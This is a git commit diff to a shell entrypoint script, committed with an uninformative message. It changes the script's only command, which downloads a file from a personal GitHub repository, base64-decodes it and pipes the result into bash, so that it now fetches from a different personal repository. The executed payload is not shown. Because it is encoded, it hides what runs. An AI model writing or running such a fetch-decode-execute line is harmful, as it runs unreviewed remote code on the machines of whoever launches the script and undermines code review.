10d7d4582ac29e121db5a5e330df9b58e70b2235
lionelchromosomes <lionelchromosomes@proton.me>
2026-05-28 03:43:04 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/paulkingdom/sharma/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/lionelchromosomes/tails/refs/heads/main/entrypoint.sh | base64 -d | bash
